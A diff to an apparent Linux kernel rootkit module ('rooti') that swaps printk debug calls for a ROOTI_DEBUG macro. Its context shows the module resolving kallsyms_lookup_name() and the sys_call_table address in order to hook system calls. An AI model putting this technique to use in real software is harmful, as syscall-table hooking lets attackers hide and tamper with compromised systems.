@@ -2,6 +2,7 @@
 #include "utils.h"      // Contains the pointer to kallsyms_lookup_name()
 #include "syscall.h"    // Contains the pointer to sys_call_table
 #include "init.h"
+#include "../utils.h"
 
 /* 
     Since kernel version 5.7.7 - kallsyms_lookup_name() is no longer exported to out-of-tree modules.
@@ -35,13 +36,13 @@ int rooti_hooking_init()
     // Resolve the address of kallsyms_lookup_name()
     __kallsyms_lookup_name = (unsigned long (*)(const char *name))rooti_resolve_kln_addr();
     if (__kallsyms_lookup_name == NULL) {
-        printk(KERN_DEBUG "rooti: rooti_resolve_kln_addr() failed: the symbol could not be found\n");
+        ROOTI_DEBUG("rooti_resolve_kln_addr() failed: the symbol could not be found");
         return -EINVAL;
     }
 
     __sys_call_table = (unsigned long *)__kallsyms_lookup_name("sys_call_table");
     if (__sys_call_table == NULL) {
-        printk(KERN_DEBUG "rooti: could not resolve the address of sys_call_table\n");
+        ROOTI_DEBUG("could not resolve the address of sys_call_table");
         return -EINVAL;
     }
 
